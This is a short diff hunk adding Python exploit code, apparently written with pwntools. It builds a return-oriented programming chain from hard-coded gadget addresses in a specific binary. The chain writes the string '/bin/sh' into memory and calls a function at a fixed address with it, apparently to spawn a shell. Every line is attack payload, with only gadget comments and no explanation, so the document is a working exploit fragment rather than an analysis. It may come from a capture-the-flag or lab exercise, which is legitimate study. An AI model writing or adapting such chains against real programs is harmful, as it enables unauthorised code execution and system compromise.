@@ -1,0 +1,11 @@
+payload = p64(0x91bb7d)
+#0x000000000091bb7d: pop rax; ret; 
+payload += p64(0x1acf020)+p64(0x64b2df)
+# 0x000000000064b2df: pop rcx; ret; 
+payload += p64(0x68732f6e69622f)+p64(0xaf7edf)
+# 0x0000000000af7edf: mov qword ptr [rax + 0x38], rcx; ret; 
+payload += p64(0x40c5a1)
+# 0x000000000040c5a1: pop rdi; ret; 
+payload += p64(0x1acf058)+p64(0x4011c6)
+# call address 0x4011c6
+payload += p64(0x4011c6)
